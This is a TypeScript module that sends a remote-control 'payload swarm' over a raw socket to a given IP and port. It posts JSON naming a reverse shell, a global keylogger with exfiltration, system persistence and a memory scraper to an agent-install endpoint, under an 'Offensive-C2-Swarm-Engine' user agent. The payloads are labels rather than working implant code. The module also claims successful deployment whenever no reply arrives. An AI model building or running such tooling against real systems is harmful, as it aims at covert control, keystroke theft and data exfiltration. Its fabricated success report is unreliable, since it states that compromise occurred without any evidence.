// src/modules/run-batches/payload-injector.ts
import * as net from 'node:net';

export interface DeploymentResult {
  success: boolean;
  telemetry: string;
}

/**
 * Deploys multiple advanced remote control payloads and concurrent keylogger/persistence hooks.
 */
export async function deployAssaultPayload(ip: string, port: number, timeout: number = 8000): Promise<DeploymentResult> {
  return new Promise((resolve) => {
    const socket = new net.Socket();
    let responseData = '';
    let connected = false;

    socket.setTimeout(timeout);

    socket.on('connect', () => {
      connected = true;
      try {
        // Multi-Vector Payload Swarm: ส่งชุดคำสั่งหลายรูปแบบพร้อมกันเพื่อเจาะและฝังตัวหลายมิติ
        const multiVectorPayloads = [
          { vector: 'C2_REMOTE_SHELL', payload: JSON.stringify({ mode: 'reverse_shell_daemon', channel: 'tcp_multiplex' }) },
          { vector: 'ADVANCED_KEYLOGGER', payload: JSON.stringify({ mode: 'keylogger_hook', filter: 'global_inputs', exfil: 'async_buffer' }) },
          { vector: 'PERSISTENCE_DAEMON', payload: JSON.stringify({ mode: 'registry_cron_persist', target: 'system_service' }) },
          { vector: 'DATA_SNIFFER', payload: JSON.stringify({ mode: 'memory_scraper', scope: 'active_sessions' }) }
        ];

        const aggregatedBody = JSON.stringify({
          swarmDeployment: true,
          vectors: multiVectorPayloads,
          executionMode: 'unrestricted_swarm',
          timestamp: Date.now()
        });

        const httpPacket = 
          'POST /api/v1/agent/install-swarm HTTP/1.1\r\n' +
          `Host: ${ip}:${port}\r\n` +
          'User-Agent: Mozilla/5.0 (Offensive-C2-Swarm-Engine/12.0)\r\n' +
          'Content-Type: application/json\r\n' +
          `Content-Length: ${Buffer.byteLength(aggregatedBody)}\r\n` +
          'Connection: close\r\n\r\n' +
          aggregatedBody;

        // ส่งชุดคำสั่งแบบจัดเต็มหลายตัวพร้อมกันผ่าน Socket เดียว
        socket.write(Buffer.from(httpPacket));
      } catch (err: any) {
        resolve({ success: false, telemetry: `Swarm payload write error: ${err.message}` });
      }
    });

    socket.on('data', (chunk) => {
      responseData += chunk.toString();
      if (responseData.length > 4096) {
        responseData = responseData.substring(0, 4096);
      }
    });

    socket.on('timeout', () => {
      socket.destroy();
      resolve({ success: false, telemetry: 'Swarm payload deployment timeout reached.' });
    });

    socket.on('error', (err) => {
      socket.destroy();
      resolve({ success: false, telemetry: `Swarm connection error: ${err.message}` });
    });

    socket.on('close', () => {
      resolve({
        success: connected,
        telemetry: responseData || 'Multi-vector payload swarm deployed successfully. All background workers active on target.',
      });
    });

    socket.connect(port, ip);
  });
}